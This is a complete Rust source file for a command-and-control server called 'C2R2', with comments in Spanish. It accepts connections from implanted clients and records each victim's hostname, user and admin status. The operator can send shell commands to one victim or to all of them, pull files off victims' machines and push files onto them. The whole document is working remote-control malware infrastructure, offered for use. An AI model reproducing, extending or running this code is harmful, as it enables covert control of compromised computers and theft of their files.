use tokio::net::{TcpListener, TcpStream};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::sync::mpsc;
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicU64, Ordering};
use std::io::{self, BufRead, Write};
use clap::Parser;
use chrono::Local;
use colored::*;
use prettytable::{Table, Row, Cell, format};
use std::fs;

type ClientId = u64;

const DELIMITER: &str = "\n<<END>>\n";

#[derive(Parser)]
#[command(name = "c2r2-server")]
#[command(about = "C2R2 Command & Control Server", long_about = None)]
struct Args {
    /// Dirección IP donde bindear (0.0.0.0 para todas las interfaces)
    #[arg(short, long, default_value = "0.0.0.0")]
    bind: String,

    /// Puerto donde escuchar conexiones
    #[arg(short, long, default_value_t = 4444)]
    port: u16,
    
    /// Modo verboso
    #[arg(short, long)]
    verbose: bool,
}

// Información del cliente
#[derive(Clone)]
struct ClientInfo {
    id: ClientId,
    addr: String,
    hostname: Option<String>,
    username: Option<String>,
    os_version: Option<String>,
    privileges: Option<String>,
    connected_at: String,
}

impl ClientInfo {
    fn new(id: ClientId, addr: String) -> Self {
        Self {
            id,
            addr,
            hostname: None,
            username: None,
            os_version: None,
            privileges: None,
            connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
        }
    }
}

// Estructura para manejar cada cliente
struct ClientHandle {
    id: ClientId,
    info: Arc<Mutex<ClientInfo>>,
    tx: mpsc::UnboundedSender<String>,
}

// Maneja la comunicación con un cliente
async fn handle_client(
    id: ClientId,
    stream: TcpStream,
    clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
    verbose: bool,
) {
    let addr = stream.peer_addr().unwrap().to_string();
    println!("{} {} {} {}", 
        "🔗".bright_green(), 
        "Nuevo cliente".bright_white().bold(),
        format!("[{}]", id).bright_cyan().bold(),
        format!("desde {}", addr).bright_white().dimmed()
    );

    let (tx, mut rx) = mpsc::unbounded_channel::<String>();
    let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
    
    {
        let mut clients = clients.lock().unwrap();
        clients.insert(id, ClientHandle {
            id,
            info: client_info.clone(),
            tx,
        });
    }

    let (reader, mut writer) = stream.into_split();
    let mut reader = BufReader::new(reader);

    // Tarea para enviar comandos al cliente con keep-alive
    let send_task = tokio::spawn(async move {
        let mut ping_interval = tokio::time::interval(tokio::time::Duration::from_secs(30));
        ping_interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
        
        loop {
            tokio::select! {
                Some(cmd) = rx.recv() => {
                    let message = format!("{}\n", cmd);
                    if let Err(e) = writer.write_all(message.as_bytes()).await {
                        if verbose {
                            eprintln!("{} Error enviando a [{}]: {}", "❌".bright_red(), id, e);
                        }
                        break;
                    }
                    if let Err(e) = writer.flush().await {
                        if verbose {
                            eprintln!("{} Error flush [{}]: {}", "❌".bright_red(), id, e);
                        }
                        break;
                    }
                }
                _ = ping_interval.tick() => {
                    // Enviar ping silencioso para mantener conexión viva
                    if verbose {
                        println!("{} Ping → {}", "🏓".bright_yellow(), format!("[{}]", id).bright_cyan());
                    }
                    if let Err(_) = writer.write_all(b"ping\n").await {
                        if verbose {
                            eprintln!("{} Error ping [{}]", "❌".bright_red(), id);
                        }
                        break;
                    }
                    if let Err(_) = writer.flush().await {
                        break;
                    }
                }
            }
        }
    });

    // Tarea para recibir respuestas del cliente
    let info = client_info.clone();
    let recv_task = tokio::spawn(async move {
        let mut command_buffer = String::new();
        
        loop {
            let mut line = String::new();
            match reader.read_line(&mut line).await {
                Ok(0) => {
                    if verbose {
                        println!("{} Cliente {} desconectado", "🔌".bright_red(), format!("[{}]", id).bright_cyan());
                    }
                    return;
                }
                Ok(_) => {
                    // Si es sysinfo, procesar inmediatamente
                    if line.starts_with("__SYSINFO__:") {
                        // Formato: __SYSINFO__:tipo:valor
                        let parts: Vec<&str> = line.trim().splitn(3, ':').collect();
                        if parts.len() >= 3 {
                            let mut info = info.lock().unwrap();
                            match parts[1] {
                                "hostname" => {
                                    info.hostname = Some(parts[2].to_string());
                                    if verbose {
                                        println!("{} {} hostname: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            parts[2].bright_white()
                                        );
                                    }
                                }
                                "username" => {
                                    info.username = Some(parts[2].to_string());
                                    if verbose {
                                        println!("{} {} username: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            parts[2].bright_white()
                                        );
                                    }
                                }
                                "os" => {
                                    info.os_version = Some(parts[2].to_string());
                                    if verbose {
                                        println!("{} {} OS: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            parts[2].bright_white()
                                        );
                                    }
                                }
                                "privileges" => {
                                    info.privileges = Some(parts[2].to_string());
                                    if verbose {
                                        let priv_colored = if parts[2] == "Admin" {
                                            parts[2].bright_red().bold()
                                        } else {
                                            parts[2].bright_yellow().bold()
                                        };
                                        println!("{} {} privilegios: {}", 
                                            "📝".bright_green(), 
                                            format!("[{}]", id).bright_cyan(),
                                            priv_colored
                                        );
                                    }
                                }
                                _ => {}
                            }
                        }
                        continue;
                    }
                    
                    // Si es pong, ignorar
                    if line.trim() == "pong" {
                        if verbose {
                            println!("{} Pong ← {}", "🏓".bright_yellow(), format!("[{}]", id).bright_cyan());
                        }
                        continue;
                    }
                    
                    // Para comandos, acumular hasta encontrar delimitador
                    command_buffer.push_str(&line);
                    if command_buffer.contains(DELIMITER) {
                        let response = command_buffer.replace(DELIMITER, "").trim().to_string();
                        if !response.is_empty() {
                            // Verificar si es una respuesta de file transfer
                            if response.starts_with("__FILE__:") {
                                handle_file_download(&response, id, verbose);
                            } else if response.starts_with("__ERROR__:") {
                                let error = response.strip_prefix("__ERROR__:").unwrap_or(&response);
                                println!();
                                println!("{} {} {}", 
                                    "❌".bright_red(), 
                                    "Error de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", error.bright_red());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();
                            } else if response.starts_with("__SUCCESS__:") {
                                let msg = response.strip_prefix("__SUCCESS__:").unwrap_or(&response);
                                println!();
                                println!("{} {} {}", 
                                    "✅".bright_green(), 
                                    "Éxito de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", msg.bright_green());
                                println!("{}", "─".repeat(60).bright_black());
                                println!();
                            } else {
                                println!();
                                println!("{} {} {}", 
                                    "📨".bright_blue(), 
                                    "Respuesta de".bright_white().bold(),
                                    format!("[{}]:", id).bright_cyan().bold()
                                );
                                println!("{}", "─".repeat(60).bright_black());
                                println!("{}", response);
                                println!("{}", "─".repeat(60).bright_black());
                                println!();
                            }
                        }
                        command_buffer.clear();
                    }
                }
                Err(e) => {
                    if verbose {
                        eprintln!("{} Error leyendo [{}]: {}", "⚠️ ".bright_yellow(), id, e);
                    }
                    return;
                }
            }
        }
    });

    // Esperar a que termine alguna tarea
    tokio::select! {
        _ = send_task => {},
        _ = recv_task => {},
    }

    // Limpiar cliente
    clients.lock().unwrap().remove(&id);
    println!("❌ Cliente [{}] desconectado", id);
}

fn handle_file_download(response: &str, client_id: ClientId, verbose: bool) {
    // Formato: __FILE__:nombre_archivo:tamaño:datos_base64
    let parts: Vec<&str> = response.splitn(4, ':').collect();
    
    if parts.len() != 4 {
        eprintln!("{} Formato de archivo inválido", "❌".bright_red());
        return;
    }
    
    let file_name = parts[1];
    let file_size = parts[2];
    let encoded_data = parts[3];
    
    if verbose {
        println!("{} Decodificando {} bytes de base64...", "🔄".bright_yellow(), encoded_data.len());
    }
    
    match base64_decode(encoded_data) {
        Ok(file_data) => {
            let save_path = format!("downloads/{}", file_name);
            
            // Crear directorio downloads si no existe
            if let Err(e) = fs::create_dir_all("downloads") {
                eprintln!("{} Error creando directorio downloads: {}", "❌".bright_red(), e);
                return;
            }
            
            match fs::write(&save_path, file_data) {
                Ok(_) => {
                    println!();
                    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_green());
                    println!("{}", format!("║              📥 ARCHIVO DESCARGADO [{}]", client_id).bright_green().bold());
                    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_green());
                    println!();
                    println!("  {} {}", "📄 Archivo:".bright_cyan().bold(), file_name.bright_white());
                    println!("  {} {}", "📊 Tamaño:".bright_cyan().bold(), format!("{} bytes", file_size).bright_white());
                    println!("  {} {}", "💾 Guardado:".bright_cyan().bold(), save_path.bright_white());
                    println!();
                }
                Err(e) => {
                    eprintln!("{} Error guardando archivo: {}", "❌".bright_red(), e);
                }
            }
        }
        Err(e) => {
            eprintln!("{} Error decodificando base64: {}", "❌".bright_red(), e);
        }
    }
}

fn base64_decode(data: &str) -> Result<Vec<u8>, String> {
    let data = data.trim();
    let mut result = Vec::new();
    
    let decode_char = |c: char| -> Result<u8, String> {
        match c {
            'A'..='Z' => Ok(c as u8 - b'A'),
            'a'..='z' => Ok(c as u8 - b'a' + 26),
            '0'..='9' => Ok(c as u8 - b'0' + 52),
            '+' => Ok(62),
            '/' => Ok(63),
            '=' => Ok(0),
            _ => Err(format!("Carácter inválido en base64: {}", c)),
        }
    };
    
    let chars: Vec<char> = data.chars().collect();
    for chunk in chars.chunks(4) {
        if chunk.len() != 4 {
            continue;
        }
        
        let b1 = decode_char(chunk[0])?;
        let b2 = decode_char(chunk[1])?;
        let b3 = decode_char(chunk[2])?;
        let b4 = decode_char(chunk[3])?;
        
        result.push((b1 << 2) | (b2 >> 4));
        if chunk[2] != '=' {
            result.push((b2 << 4) | (b3 >> 2));
        }
        if chunk[3] != '=' {
            result.push((b3 << 6) | b4);
        }
    }
    
    Ok(result)
}

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    
    for chunk in data.chunks(3) {
        let mut buf = [0u8; 3];
        for (i, &byte) in chunk.iter().enumerate() {
            buf[i] = byte;
        }
        
        let b1 = (buf[0] >> 2) & 0x3F;
        let b2 = ((buf[0] & 0x03) << 4) | ((buf[1] >> 4) & 0x0F);
        let b3 = ((buf[1] & 0x0F) << 2) | ((buf[2] >> 6) & 0x03);
        let b4 = buf[2] & 0x3F;
        
        result.push(CHARS[b1 as usize] as char);
        result.push(CHARS[b2 as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[b3 as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[b4 as usize] as char } else { '=' });
    }
    
    result
}

#[tokio::main]
async fn main() {
    let args = Args::parse();

    // Banner con colores
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
    println!("{}", "║          C2R2 - Command & Control Server v2.0            ║".bright_cyan());
    println!("{}", "║              Direct Connection - No Shellcode            ║".bright_cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
    println!();
    println!("{} {}", "🌐 Listening:".bright_green().bold(), format!("{}:{}", args.bind, args.port).bright_white());
    println!("{} {}", "📝 Help:".bright_yellow().bold(), "/help".bright_white());
    if args.verbose {
        println!("{}", "🔍 Verbose Mode: ON".bright_magenta());
    }
    println!();

    let listener = TcpListener::bind(format!("{}:{}", args.bind, args.port))
        .await
        .expect("No se pudo iniciar el servidor");

    let clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>> = Arc::new(Mutex::new(HashMap::new()));
    let next_id = Arc::new(AtomicU64::new(1));
    let selected_client: Arc<Mutex<Option<ClientId>>> = Arc::new(Mutex::new(None));

    // Tarea para aceptar conexiones
    let clients_clone = clients.clone();
    let next_id_clone = next_id.clone();
    let verbose = args.verbose;
    tokio::spawn(async move {
        loop {
            match listener.accept().await {
                Ok((stream, _)) => {
                    let id = next_id_clone.fetch_add(1, Ordering::SeqCst);
                    let clients = clients_clone.clone();
                    tokio::spawn(handle_client(id, stream, clients, verbose));
                }
                Err(e) => {
                    eprintln!("{} {}", "❌ Error:".bright_red().bold(), e);
                }
            }
        }
    });

    // Loop para comandos del usuario
    let stdin = io::stdin();
    let mut lines = stdin.lock().lines();

    loop {
        // Mostrar prompt con cliente seleccionado
        let selected = *selected_client.lock().unwrap();
        if let Some(id) = selected {
            print!("{} ", format!("C2R2[{}]>", id).bright_green().bold());
        } else {
            print!("{} ", "C2R2>".bright_blue().bold());
        }
        let _ = io::stdout().flush();

        if let Some(Ok(line)) = lines.next() {
            let parts: Vec<&str> = line.trim().split_whitespace().collect();
            
            if parts.is_empty() {
                continue;
            }

            match parts[0] {
                "/help" => {
                    println!();
                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
                    println!("{}", "                    📖 COMANDOS DISPONIBLES".bright_cyan().bold());
                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
                    println!();
                    println!("  {} {:<20} {}", "📋".bright_yellow(), "/list", "Lista todos los clientes conectados con info".bright_white());
                    println!("  {} {:<20} {}", "🎯".bright_green(), "/select <id>", "Selecciona un cliente por ID".bright_white());
                    println!("  {} {:<20} {}", "📤".bright_blue(), "/cmd <comando>", "Envía comando al cliente seleccionado".bright_white());
                    println!("  {} {:<20} {}", "📡".bright_magenta(), "/cmd_all <cmd>", "Envía comando a TODOS los clientes".bright_white());
                    println!("  {} {:<20} {}", "📥".bright_cyan(), "/download <ruta>", "Descarga archivo desde el cliente".bright_white());
                    println!("  {} {:<20} {}", "📤".bright_green(), "/upload <local> <remoto>", "Sube archivo al cliente".bright_white());
                    println!("  {} {:<20} {}", "ℹ️ ".bright_cyan(), "/info <id>", "Muestra info detallada de un cliente".bright_white());
                    println!("  {} {:<20} {}", "🔄".bright_yellow(), "/deselect", "Deselecciona el cliente actual".bright_white());
                    println!("  {} {:<20} {}", "👋".bright_red(), "/exit, /quit", "Cierra el servidor".bright_white());
                    println!("  {} {:<20} {}", "❓".bright_cyan(), "/help", "Muestra este menú".bright_white());
                    println!();
                    println!("{}", "═══════════════════════════════════════════════════════════".bright_cyan());
                    println!();
                }
                "/list" => {
                    let clients = clients.lock().unwrap();
                    if clients.is_empty() {
                        println!("{}", "⚠️  No hay clientes conectados".bright_yellow());
                    } else {
                        println!();
                        let mut table = Table::new();
                        table.set_format(*format::consts::FORMAT_BOX_CHARS);
                        
                        // Header con colores
                        table.add_row(Row::new(vec![
                            Cell::new("ID").style_spec("Fb"),
                            Cell::new("Dirección").style_spec("Fb"),
                            Cell::new("Hostname").style_spec("Fb"),
                            Cell::new("Usuario").style_spec("Fb"),
                            Cell::new("OS").style_spec("Fb"),
                            Cell::new("Privilegios").style_spec("Fb"),
                            Cell::new("Conectado").style_spec("Fb"),
                        ]));
                        
                        for (id, client) in clients.iter() {
                            let info = client.info.lock().unwrap();
                            let priv_color = if info.privileges.as_deref() == Some("Admin") { "Fr" } else { "Fy" };
                            
                            table.add_row(Row::new(vec![
                                Cell::new(&id.to_string()).style_spec("Fc"),
                                Cell::new(&info.addr),
                                Cell::new(info.hostname.as_deref().unwrap_or("...")),
                                Cell::new(info.username.as_deref().unwrap_or("...")),
                                Cell::new(info.os_version.as_deref().unwrap_or("...")),
                                Cell::new(info.privileges.as_deref().unwrap_or("...")).style_spec(priv_color),
                                Cell::new(&info.connected_at).style_spec("Fd"),
                            ]));
                        }
                        
                        println!("{}", format!("📋 {} cliente(s) conectado(s)", clients.len()).bright_green().bold());
                        table.printstd();
                        println!();
                    }
                }
                "/info" => {
                    if parts.len() < 2 {
                        println!("{} /info <id>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    if let Ok(id) = parts[1].parse::<ClientId>() {
                        let clients = clients.lock().unwrap();
                        if let Some(client) = clients.get(&id) {
                            let info = client.info.lock().unwrap();
                            println!();
                            println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
                            println!("{}", format!("║              INFORMACIÓN DEL CLIENTE [{}]                ║", id).bright_cyan().bold());
                            println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
                            println!();
                            println!("  {} {}", "🆔 ID:".bright_green().bold(), id.to_string().bright_white());
                            println!("  {} {}", "🌐 Dirección:".bright_green().bold(), info.addr.bright_white());
                            println!("  {} {}", "💻 Hostname:".bright_green().bold(), info.hostname.as_deref().unwrap_or("N/A").bright_white());
                            println!("  {} {}", "👤 Usuario:".bright_green().bold(), info.username.as_deref().unwrap_or("N/A").bright_white());
                            println!("  {} {}", "🖥️  OS:".bright_green().bold(), info.os_version.as_deref().unwrap_or("N/A").bright_white());
                            
                            let priv_str = info.privileges.as_deref().unwrap_or("N/A");
                            let priv_colored = if priv_str == "Admin" { 
                                priv_str.bright_red().bold() 
                            } else { 
                                priv_str.bright_yellow().bold() 
                            };
                            println!("  {} {}", "🔑 Privilegios:".bright_green().bold(), priv_colored);
                            println!("  {} {}", "⏰ Conectado:".bright_green().bold(), info.connected_at.bright_white());
                            println!();
                        } else {
                            println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                        }
                    } else {
                        println!("{} ID inválido", "❌".bright_red());
                    }
                }
                "/select" => {
                    if parts.len() < 2 {
                        println!("{} /select <id>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    if let Ok(id) = parts[1].parse::<ClientId>() {
                        let clients = clients.lock().unwrap();
                        if clients.contains_key(&id) {
                            *selected_client.lock().unwrap() = Some(id);
                            println!("{} {}", "✅ Cliente".bright_green(), format!("[{}]", id).bright_cyan().bold());
                            println!("{}", "   Usa /cmd <comando> para enviar comandos".bright_white().dimmed());
                        } else {
                            println!("{} Cliente {} no encontrado", "❌".bright_red(), id);
                        }
                    } else {
                        println!("{} ID inválido", "❌".bright_red());
                    }
                }
                "/deselect" => {
                    *selected_client.lock().unwrap() = None;
                    println!("{}", "✅ Cliente deseleccionado".bright_green());
                }
                "/download" => {
                    if parts.len() < 2 {
                        println!("{} /download <ruta_remota>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let remote_path = parts[1..].join(" ");
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            let command = format!("__DOWNLOAD__:{}", remote_path);
                            if let Err(e) = client.tx.send(command) {
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            } else {
                                println!("{} Solicitando descarga de: {}", 
                                    "📥".bright_cyan(), 
                                    remote_path.bright_white()
                                );
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/upload" => {
                    if parts.len() < 3 {
                        println!("{} /upload <archivo_local> <ruta_remota>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let local_path = parts[1];
                    let remote_path = parts[2..].join(" ");
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        // Leer archivo local
                        match fs::read(local_path) {
                            Ok(file_data) => {
                                let encoded = base64_encode(&file_data);
                                let command = format!("__UPLOAD__|{}|{}", remote_path, encoded);
                                
                                let clients = clients.lock().unwrap();
                                if let Some(client) = clients.get(&id) {
                                    if let Err(e) = client.tx.send(command) {
                                        println!("{} {}", "❌ Error:".bright_red().bold(), e);
                                    } else {
                                        println!();
                                        println!("{}", "╔═══════════════════════════════════════════════════════════╗".bright_cyan());
                                        println!("{}", format!("║              📤 SUBIENDO ARCHIVO [{}]", id).bright_cyan().bold());
                                        println!("{}", "╚═══════════════════════════════════════════════════════════╝".bright_cyan());
                                        println!();
                                        println!("  {} {}", "📄 Local:".bright_green().bold(), local_path.bright_white());
                                        println!("  {} {}", "🎯 Remoto:".bright_green().bold(), remote_path.bright_white());
                                        println!("  {} {}", "📊 Tamaño:".bright_green().bold(), format!("{} bytes", file_data.len()).bright_white());
                                        println!();
                                    }
                                } else {
                                    println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                                    *selected_client.lock().unwrap() = None;
                                }
                            }
                            Err(e) => {
                                println!("{} Error leyendo archivo local: {}", "❌".bright_red(), e);
                            }
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/cmd" => {
                    if parts.len() < 2 {
                        println!("{} /cmd <comando>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let selected = *selected_client.lock().unwrap();
                    
                    if let Some(id) = selected {
                        let clients = clients.lock().unwrap();
                        
                        if let Some(client) = clients.get(&id) {
                            if let Err(e) = client.tx.send(command.clone()) {
                                println!("{} {}", "❌ Error:".bright_red().bold(), e);
                            } else {
                                println!("{} {} → {}", 
                                    "📤".bright_blue(), 
                                    format!("[{}]", id).bright_cyan().bold(), 
                                    command.bright_white()
                                );
                            }
                        } else {
                            println!("{} Cliente {} desconectado", "❌".bright_red(), id);
                            *selected_client.lock().unwrap() = None;
                        }
                    } else {
                        println!("{}", "❌ No hay cliente seleccionado. Usa /select <id>".bright_red());
                    }
                }
                "/cmd_all" => {
                    if parts.len() < 2 {
                        println!("{} /cmd_all <comando>", "❌ Uso:".bright_red());
                        continue;
                    }
                    
                    let command = parts[1..].join(" ");
                    let clients = clients.lock().unwrap();
                    
                    if clients.is_empty() {
                        println!("{}", "❌ No hay clientes conectados".bright_red());
                    } else {
                        let mut count = 0;
                        for (id, client) in clients.iter() {
                            if client.tx.send(command.clone()).is_ok() {
                                println!("{} {} → {}", 
                                    "�".bright_magenta(), 
                                    format!("[{}]", id).bright_cyan().bold(), 
                                    command.bright_white().dimmed()
                                );
                                count += 1;
                            }
                        }
                        println!("{} Enviado a {} cliente(s)", "✅".bright_green(), count.to_string().bright_cyan().bold());
                    }
                }
                "/exit" | "/quit" => {
                    println!();
                    println!("{}", "👋 Cerrando C2R2 Server...".bright_yellow().bold());
                    println!();
                    std::process::exit(0);
                }
                _ => {
                    println!("{} Comando '{}' desconocido. Usa {}", 
                        "❌".bright_red(), 
                        parts[0].bright_yellow(), 
                        "/help".bright_cyan()
                    );
                }
            }
        }
    }
}
